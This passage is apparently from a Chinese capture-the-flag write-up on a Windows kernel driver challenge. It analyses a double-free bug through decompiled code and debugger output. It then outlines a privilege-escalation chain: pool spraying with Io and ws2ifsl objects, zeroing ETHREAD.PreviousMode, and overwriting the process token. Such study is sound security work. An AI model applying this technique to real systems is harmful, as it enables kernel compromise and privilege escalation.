*)DeviceExtension + <span class="number">2</span>));</span><br><span class="line">      __pVirtualAddress = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C40240C</span>:</span><br><span class="line">      __pStartAddr2 = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">3</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pStartAddr2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      __pMdl2 = (<span class="keyword">struct</span> _MDL *)*((_QWORD *)DeviceExtension + <span class="number">5</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pMdl2 || !*((_QWORD *)DeviceExtension + <span class="number">4</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="built_in">MmUnmapLockedPages</span>(__pStartAddr2, __pMdl2);</span><br><span class="line">      <span class="built_in">IoFreeMdl</span>(*((PMDL *)DeviceExtension + <span class="number">5</span>));</span><br><span class="line">      __pVirtualAddress = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">4</span>);</span><br><span class="line">LABEL_16:</span><br><span class="line">      <span class="built_in">MmFreeContiguousMemory</span>(__pVirtualAddress);</span><br><span class="line">LABEL_17:</span><br><span class="line">      irp-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0xC0000010</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">  irp-&gt;IoStatus.Status = v3;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(irp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MDL"><a href="#MDL" class="headerlink" title="MDL"></a>MDL</h3><p>memory descriptor list</p>
<p>跨一系列连续虚拟内存地址的 I&#x2F;O 缓冲区可以分布在多个物理页中，并且这些页面可以是不连续的。 操作系统使用 <em>内存描述符列表</em> (MDL) 来描述虚拟内存缓冲区的物理页面布局。</p>
<ul>
<li>StartVa：page开始的地址</li>
<li>ByteOffset：在page内的偏移</li>
<li>ByteCount: 大小</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_MDL</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span>      *Next;</span><br><span class="line">  CSHORT           Size;</span><br><span class="line">  CSHORT           MdlFlags;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_EPROCESS</span> *Process;</span><br><span class="line">  PVOID            MappedSystemVa;</span><br><span class="line">  PVOID            StartVa;</span><br><span class="line">  ULONG            ByteCount;</span><br><span class="line">  ULONG            ByteOffset;</span><br><span class="line">&#125; MDL, *PMDL;</span><br></pre></td></tr></table></figure>

<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p><strong>MmAllocateContiguousMemory</strong>：分配一系列连续的NonPagedPool内存，并将其映射到系统地址空间，分配的内存未初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回已分配内存的基虚拟地址。</span></span><br><span class="line"><span class="function">PVOID <span class="title">MmAllocateContiguousMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T           NumberOfBytes,           <span class="comment">// 要分配的连续内存块的大小（以字节为单位）</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PHYSICAL_ADDRESS HighestAcceptableAddress <span class="comment">// 调用方可以使用的最高有效物理地址。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>释放由 <strong>MmAllocateContiguousMemoryXxx</strong> 分配的一系列物理连续内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MmFreeContiguousMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PVOID BaseAddress</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>给定缓冲区的起始地址和长度， <strong>IoAllocateMdl</strong> 分配内存描述符列表 (MDL) 足以映射缓冲区（NonPagedPool）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回指向 MDL 的指针</span></span><br><span class="line"><span class="function">PMDL <span class="title">IoAllocateMdl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      __drv_aliasesMem PVOID VirtualAddress,   <span class="comment">// 指向 MDL 要描述的缓冲区的基虚拟地址的指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                ULONG                  Length,           <span class="comment">// 指定 MDL 要描述的缓冲区的长度（以字节为单位）</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOLEAN                SecondaryBuffer,  <span class="comment">// 指示缓冲区是主缓冲区还是辅助缓冲区。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOLEAN                ChargeQuota,      <span class="comment">// 预留给系统使用。 驱动程序必须将此参数设置为 **FALSE**。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] PIRP                   Irp               <span class="comment">// 指向要与 MDL 关联的 IRP 的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ntoskrnl.exe</span></span><br><span class="line">result = (PMDL)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, size, <span class="string">&#x27; ldM&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>创建一个MDL结构体，而这个结构体描述给出的VurtualAddress</p>
<p><strong>IoFreeMdl</strong> 释放调用方分配的内存描述符列表 (MDL) 。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IoFreeMdl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMDL Mdl</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>MmBuildMdlForNonPagedPool</strong> 接收指定非分页虚拟内存缓冲区的 MDL，并更新它以描述基础物理页。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MmBuildMdlForNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out] PMDL MemoryDescriptorList    <span class="comment">// 指向 MDL 的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>MmMapLockedPagesSpecifyCache</strong> 将 MDL 描述的物理页面映射到虚拟地址，并使调用方能够指定用于创建映射的缓存属性。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">MmMapLockedPagesSpecifyCache</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PMDL                                                                          MemoryDescriptorList,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           __drv_strictType(KPROCESSOR_MODE / <span class="keyword">enum</span> _MODE,__drv_typeConst)KPROCESSOR_MODE AccessMode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           __drv_strictTypeMatch(__drv_typeCond)MEMORY_CACHING_TYPE                      CacheType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PVOID                                                                         RequestedAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG                                                                         BugCheckOnFailure,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG                                                                         Priority</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>映射 MDL 的 MmMapLockedPagesSpecifyCache 函数发现其既可以将 MDL 描述的虚拟地址缓冲区的物理页映射到内核虚拟地址空间中也可以映射到用户虚拟地址空间中，取决于其第二个参数 AccessMode</p>
<p>AccessMode：<strong>KernelMode</strong> 或 <strong>UserMode</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_MODE</span> &#123; </span><br><span class="line">    KernelMode, </span><br><span class="line">    UserMode, </span><br><span class="line">    MaximumMode </span><br><span class="line">&#125; MODE; </span><br></pre></td></tr></table></figure>

<p><code>MmNonCached</code>：请求的内存不应由处理器缓存。</p>
<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>分配了两个NonPagedPool内存，在Free后并没有把相关位置置为0，可以多次free。</p>
<p>下断点调试</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; lm m s*</span><br><span class="line">Browse full <span class="keyword">module</span> list</span><br><span class="line"><span class="comment">// 查看start内存，PE文件格式</span></span><br><span class="line">start             end                 <span class="keyword">module</span> name</span><br><span class="line">fffff805`<span class="number">1b</span>010000 fffff805`<span class="number">1b</span>019000   <span class="built_in">sioctl</span>     (no symbols)</span><br><span class="line"><span class="comment">// IDA: 140005020 </span></span><br><span class="line"><span class="comment">// 偏移：0x5020 </span></span><br><span class="line"><span class="number">0</span>: kd&gt; ba e1 sioctl+<span class="number">0x5020</span>  <span class="comment">// ioctl</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; p</span><br></pre></td></tr></table></figure>

<p><code>0x9C402400</code> IoAllocateMdl，根据返回值确定一下MDL的大小</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; </span><br><span class="line">sioctl+<span class="number">0x521e</span>:</span><br><span class="line">fffff80a`<span class="number">9852521</span>e ff150cceffff    call    qword ptr [sioctl+<span class="number">0x2030</span> (fffff80a`<span class="number">98522030</span>)]</span><br><span class="line"></span><br><span class="line">*ffff880ab958ed20 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated) *Mdl</span><br></pre></td></tr></table></figure>

<p>但是程序走到Memset会报错，因为地址不对，可以从汇编看出来使用32位地址截断</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PAGE:<span class="number">000000014000526F</span>                 mov     ecx, r12d       ; Dst</span><br><span class="line">PAGE:<span class="number">0000000140005272</span>                 mov     edx, <span class="number">0F</span>Fh       ; Val</span><br><span class="line">PAGE:<span class="number">0000000140005277</span>                 mov     r8d, r15d       ; Size</span><br></pre></td></tr></table></figure>

<h3 id="Io-NpFr-Ws2P"><a href="#Io-NpFr-Ws2P" class="headerlink" title="Io&#x2F;NpFr&#x2F;Ws2P"></a>Io&#x2F;NpFr&#x2F;Ws2P</h3><p>官方WP：<a href="https://xz.aliyun.com/t/14190">第二届AliyunCTF官方writeup</a> – 因为这里设计是给32位程序使用的回调，64位程序的用户态地址在发生integer truncation后往往是非法地址，预期是通过一个32位的程序完成利用</p>
<p>在VS里选择x86生成，<code>0x9C402400</code> 确实没有崩溃。</p>
<ul>
<li>这里还必须得使用，因为如果 <code>MmAllocateContiguousMemory</code> 分配的内存被连续释放会蓝屏</li>
</ul>
<p>思路是 DF 转化为 指定结构体的 UAF。</p>
<p>这里作者介绍了两种堆喷的对象</p>
<ul>
<li>IopVerifierExAllocatePoolWithQuota的调用中会申请类型为NonPagedPoolNx的Pool</li>
<li>经典的NpFr</li>
</ul>
<h4 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h4><p>这个<strong>结构大小可以控制，内容可以控制</strong>，品相相当不错</p>
<p>IopVerifierExAllocatePoolWithQuota：其上层调用如NtSetInformationFile、NtSetEaFile等函数都可以实现控制申请pool的大小，并写入内容。但是却存在一个问题，就是这类poolTag为IO的池，都会在IO结束时被释放，虽然被释放了，但是当前内核池的内容并没有立即被占用，内容还在。</p>
<p>相关内容：<a href="https://www.anquanke.com/post/id/255916">etw 事件管理器内核漏洞利用</a></p>
<p>ntkrnlImp.exe（ntoskrnl.exe）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID __fastcall <span class="title">IopVerifierExAllocatePoolWithQuota</span><span class="params">(__int64 a1, SIZE_T a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PVOID result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !ViVerifierEnabled</span><br><span class="line">    || (VfRuleClasses &amp; <span class="number">0xFFAFFFFF</span>) == <span class="number">0</span></span><br><span class="line">    &amp;&amp; (VfRuleClasses &amp; <span class="number">0x200000000</span>i64) == <span class="number">0</span></span><br><span class="line">    &amp;&amp; (VfRuleClasses &amp; <span class="number">0x400000000</span>i64) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ExAllocatePoolWithQuotaTag</span>(NonPagedPoolNx, a2, <span class="string">&#x27;  oI&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="built_in">ExAllocatePoolWithTagPriority</span>(</span><br><span class="line">             NonPagedPoolNx,</span><br><span class="line">             a2,</span><br><span class="line">             <span class="number">0x20206F49</span>u,</span><br><span class="line">             (EX_POOL_PRIORITY)((MmVerifierData &amp; <span class="number">0x10</span> | <span class="number">0x40</span>u) &gt;&gt; <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="built_in">RtlRaiseStatus</span>(<span class="number">3221225626</span>i64);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>交叉引用：NtSetEaFile，该函数内部检测DEVICE_OBJECT的Flags是否包含4（DO_BUFFERED_IO），因此第一个参数的句柄给的是<code>PEAuth</code>的文件句柄，EVICE_OBJECT的Flags为0x44。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSYSAPI </span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">NTAPI</span></span><br><span class="line"><span class="function"><span class="title">NtSetEaFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN HANDLE               FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  OUT PIO_STATUS_BLOCK    IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN PVOID                EaBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN ULONG                EaBufferSize </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sets extended-attribute (EA) values for a file.</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">NtSetEaFile</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> __int64 a3, ULONG a4)</span></span></span><br><span class="line"><span class="function"><span class="comment">// ...</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">v4 </span>= (<span class="type">void</span> *)a3;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// v12 是经过 a1(FileHandler) 寻找到的Object</span></span><br><span class="line">DeviceObject = <span class="built_in">IoGetRelatedDeviceObject</span>(v12);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">Flags = DeviceObject-&gt;Flags;</span><br><span class="line"><span class="keyword">if</span> ( (Flags &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">	ErrorOffset = <span class="number">0</span>;</span><br><span class="line">	v26 = a4;</span><br><span class="line">	<span class="keyword">if</span> ( a4 )</span><br><span class="line">	&#123;</span><br><span class="line">	  v35 = <span class="number">0</span>;</span><br><span class="line">	  PoolWithQuota = (<span class="keyword">struct</span> _FILE_FULL_EA_INFORMATION *)<span class="built_in">IopVerifierExAllocatePoolWithQuota</span>(<span class="number">0</span>i64, a4);</span><br><span class="line">	  Irp-&gt;AssociatedIrp.MasterIrp = (_IRP *)PoolWithQuota;</span><br><span class="line">	  <span class="built_in">memmove</span>(PoolWithQuota, v4, a4);</span><br><span class="line">	  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h4 id="Ws2P"><a href="#Ws2P" class="headerlink" title="Ws2P"></a>Ws2P</h4><p>另外一个对象，作者给出 <code>ws2ifsl</code>，可以看如下的文章了解一下</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/196893">Windows内核ws2ifsl.sys中UAF漏洞分析</a></li>
<li><a href="https://bbs.kanxue.com/thread-257435.htm">CVE-2019-1215分析笔记</a></li>
</ul>
<p>当调用NtCreateFile时，文件名设置为<code>\Device\WS2IFSL\</code>，将调用DispatchCreate函数，函数将根据文件名中的<code>_FILE_FULL_EA_INFORMATION.EaName</code>字符串进行判断，如果是NifsPvd，它将调用CreateProcessFile，如果是NifsSct，它将调用CreateSocketFile。</p>
<p>CreateProcessFile函数都创建内部对象，称为<code>procData</code>。创建后，这些对象将保存在文件对象的<code>_FILE_OBJECT.FsContext</code>中</p>
<p>ws2ifsl.sys!DispatchCreate</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchCreate</span><span class="params">(__int64 a1, IRP *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 MasterIrp; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span> *CurrentStackLocation; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ProcessFile; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  MasterIrp = (__int64)a2-&gt;AssociatedIrp.MasterIrp;</span><br><span class="line">  <span class="keyword">if</span> ( !MasterIrp )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  CurrentStackLocation = a2-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(MasterIrp + <span class="number">5</span>) != <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp_0</span>((<span class="type">const</span> <span class="type">char</span> *)(MasterIrp + <span class="number">8</span>), <span class="string">&quot;NifsSct&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp_0</span>((<span class="type">const</span> <span class="type">char</span> *)(MasterIrp + <span class="number">8</span>), <span class="string">&quot;NifsPvd&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ProcessFile = <span class="built_in">CreateProcessFile</span>((__int64)CurrentStackLocation-&gt;FileObject, a2-&gt;RequestorMode, MasterIrp);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">    v7 = <span class="number">-1073741811</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v5) = a2-&gt;RequestorMode;</span><br><span class="line">  ProcessFile = <span class="built_in">CreateSocketFile</span>(CurrentStackLocation-&gt;FileObject, v5, MasterIrp);</span><br><span class="line">LABEL_7:</span><br><span class="line">  v7 = ProcessFile;</span><br><span class="line">LABEL_9:</span><br><span class="line">  a2-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">  a2-&gt;IoStatus.Status = v7;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(a2, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ws2ifsl!CreateProcessFile，一个tag位Ws2P的池 ProcData</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CreateProcessFile</span><span class="params">(PFILE_OBJECT pFileObj, KPROCESSOR_MODE Mode, <span class="keyword">struct</span> _IRP *Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  Blink = Irp-&gt;ThreadListEntry.Blink;</span><br><span class="line">  Flink = Irp-&gt;ThreadListEntry.Flink;</span><br><span class="line">  MasterIrp = Irp-&gt;AssociatedIrp.MasterIrp;</span><br><span class="line">  Flags = *(<span class="type">void</span> **)&amp;Irp-&gt;Flags;</span><br><span class="line">LABEL_7:</span><br><span class="line">  Object = <span class="number">0</span>i64;</span><br><span class="line">  v12 = <span class="built_in">ObReferenceObjectByHandle</span>(Flags, <span class="number">0x10</span>u, (POBJECT_TYPE)PsThreadType, Mode, &amp;Object, <span class="number">0</span>i64);</span><br><span class="line">  _object = Object;</span><br><span class="line">  <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="built_in">IoThreadToProcess</span>((PETHREAD)Object);</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="built_in">IoGetCurrentProcess</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      Pool2 = <span class="built_in">ExAllocatePool2</span>(<span class="number">0x61</span>i64, <span class="number">0x110</span>i64, <span class="string">&#x27;P2sW&#x27;</span>);</span><br><span class="line">      _Pool2 = Pool2;</span><br><span class="line">      <span class="keyword">if</span> ( Pool2 )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)Pool2 = <span class="string">&#x27;corP&#x27;</span>;</span><br><span class="line">        *(_QWORD *)(Pool2 + <span class="number">8</span>) = <span class="built_in">PsGetCurrentProcessId</span>();</span><br><span class="line">        *(_DWORD *)(_Pool2 + <span class="number">0x100</span>) = <span class="number">0</span>;</span><br><span class="line">        *(_QWORD *)(_Pool2 + <span class="number">0x108</span>) = <span class="number">1</span>i64;</span><br><span class="line">        <span class="built_in">LOBYTE</span>(_Mode) = Mode;</span><br><span class="line">        v12 = <span class="built_in">InitializeRequestQueue</span>(_Pool2, (<span class="type">int</span>)_object, _Mode, (<span class="type">int</span>)MasterIrp, Blink);</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">LOBYTE</span>(__Mode) = Mode;</span><br><span class="line">          v12 = <span class="built_in">InitializeCancelQueue</span>(_Pool2, (<span class="type">int</span>)_object, __Mode, (<span class="type">int</span>)Flink, Blink);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          pFileObj-&gt;FsContext = (PVOID)_Pool2;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>InitializeRequestQueue &amp;&amp; InitializeCancelQueue: 初始化Apc请求&#x2F;取消队列</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">InitializeRequestQueue</span><span class="params">(PVOID Pool, PVOID a2, <span class="type">char</span> Mode, <span class="keyword">struct</span> _IRP *a4, PVOID ApcContext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">  ApcRoutine = a4;</span><br><span class="line">  *((_BYTE *)Pool + <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_QWORD *)Pool + <span class="number">3</span>) = (<span class="type">char</span> *)Pool + <span class="number">16</span>;</span><br><span class="line">  *((_QWORD *)Pool + <span class="number">2</span>) = (<span class="type">char</span> *)Pool + <span class="number">16</span>;</span><br><span class="line">  <span class="built_in">KeInitializeSpinLock</span>((PKSPIN_LOCK)Pool + <span class="number">5</span>);</span><br><span class="line">  v8 = <span class="built_in">PsWrapApcWow64Thread</span>(&amp;ApcContext, &amp;ApcRoutine);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = Mode;</span><br><span class="line">    <span class="built_in">KeInitializeApc</span>(</span><br><span class="line">      (<span class="type">char</span> *)Pool + <span class="number">48</span>,</span><br><span class="line">      a2,</span><br><span class="line">      <span class="number">0</span>i64,</span><br><span class="line">      guard_check_icall_nop,</span><br><span class="line">      RequestRundownRoutine,</span><br><span class="line">      ApcRoutine,</span><br><span class="line">      v10,</span><br><span class="line">      ApcContext);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">InitializeCancelQueue</span><span class="params">(PVOID pool, PVOID obj, <span class="type">char</span> mode, <span class="keyword">struct</span> _IRP *a4, PVOID ApcContext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NTSTATUS v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+30h] [rbp-18h]</span></span><br><span class="line">  PVOID ApcRoutine; <span class="comment">// [rsp+68h] [rbp+20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ApcRoutine = a4;</span><br><span class="line">  *((_BYTE *)pool + <span class="number">152</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_QWORD *)pool + <span class="number">18</span>) = (<span class="type">char</span> *)pool + <span class="number">136</span>;</span><br><span class="line">  *((_QWORD *)pool + <span class="number">17</span>) = (<span class="type">char</span> *)pool + <span class="number">136</span>;</span><br><span class="line">  <span class="built_in">KeInitializeSpinLock</span>((PKSPIN_LOCK)pool + <span class="number">20</span>);</span><br><span class="line">  v8 = <span class="built_in">PsWrapApcWow64Thread</span>(&amp;ApcContext, &amp;ApcRoutine);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = mode;</span><br><span class="line">    <span class="built_in">KeInitializeApc</span>(</span><br><span class="line">      (<span class="type">char</span> *)pool + <span class="number">168</span>,</span><br><span class="line">      obj,</span><br><span class="line">      <span class="number">0</span>i64,</span><br><span class="line">      guard_check_icall_nop,</span><br><span class="line">      CancelRundownRoutine,</span><br><span class="line">      ApcRoutine,</span><br><span class="line">      v10,</span><br><span class="line">      ApcContext);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>释放的位置在DispatchClose函数中 <code>ExFreePoolWithTag</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  FsContext = (PVOID *)a2-&gt;Tail.Overlay.CurrentStackLocation-&gt;FileObject-&gt;FsContext;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)FsContext == <span class="string">&#x27;corP&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">ObfDereferenceObject</span>(FsContext[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">DereferenceProcessContext</span>(FsContext);</span><br><span class="line">LABEL_8:</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是这个池大小 0x110，加上PoolHeader就是0x120</p>
<p><strong>在CloseHandle时，调用<code>ObfDereferenceObject</code>函数，也就是将这个位置上的值<code>-1</code>。因此我们可以将<code>ETHREAD.PreviousMode</code> 从 1减为0。</strong></p>
<p>因此大致流程</p>
<ul>
<li>heap spray 减少碎片</li>
<li>allocate ContiguousMemory &amp;&amp; MDL</li>
<li>free ContiguousMemory &amp;&amp; MDL</li>
<li>使用 ws2ifsl 占位MDL (Ws2P ProcData)</li>
<li>double free ContiguousMemory &amp;&amp; MDL</li>
<li>使用Io占位MDL，修改Ws2P偏移为28的值为<code>ETHREAD.PreviousMode</code></li>
<li>CloseHandler 导致<code>ETHREAD.PreviousMode</code>为0</li>
<li>NtWriteVirtualMemory 任意地址写，替换token</li>
</ul>
<p>但是改成x86的程序后，导致泄露的EPROCESS地址被截断。</p>
<p>因此官方给出三个文件</p>
<ul>
<li>helper.exe 64位，使用NtQuerySystemInfomation获取信息</li>
<li>poc.exe: 32位，</li>
<li>exp.exe：调用两个文件</li>
<li>使用了命名管道进行通信同步</li>
</ul>
<p>必须等待回收资源才能减去1</p>
<p>Nu1L 提了一个关闭 dynbase，通过这个也可以修改</p>
<ul>
<li><a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/dynamicbase-use-address-space-layout-randomization?view=msvc-170">&#x2F;DYNAMICBASE（使用地址空间布局随机化功能） | Microsoft Learn</a></li>
</ul>
<p>exp</p>
